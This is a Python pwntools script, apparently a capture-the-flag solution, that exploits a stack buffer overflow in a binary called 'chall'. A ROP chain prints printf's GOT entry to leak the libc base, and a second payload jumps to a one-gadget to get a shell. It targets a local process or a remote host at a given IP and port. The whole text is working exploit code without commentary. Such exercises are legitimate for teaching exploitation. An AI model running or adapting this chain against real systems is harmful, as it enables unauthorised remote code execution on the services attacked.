from pwn import *

DEBUG = False

if DEBUG:
    r = process("./chall")
    gdb.attach(r, api=True)
    printf_off = 0x000000000060770
    onegadget = 0xe3b04

else:
    r = remote("34.143.158.202", 4097)
    printf_off = 0x000000000061c90
    onegadget = 0xebcf5

ret_gadget = 0x0000000000401016
printf = 0x401060
pop_rdi_ret = 0x000000000040137b
main = 0x0000000000401208
printf_got = 0x404030
exit = 0x4010b0

print(r.recvuntil(b">"))
payload = b"a"*56 + p64(ret_gadget) + p64(pop_rdi_ret) + p64(printf_got) + p64(printf) + p64(ret_gadget) + p64(main)
r.sendline(payload)
r.sendline(b"a")

r.recvuntil(b"NOPE\n")
outp = r.recvuntil(b"*-")
leak = outp[:-2]
l = int.from_bytes(leak, byteorder='little')
base = l - printf_off
print(hex(base))

print(r.recvuntil(b">"))
payload = b"a"*56 + p64(ret_gadget) + p64(base+onegadget) + p64(ret_gadget) + p64(exit)
r.sendline(payload)
r.sendline(b"a")

r.interactive()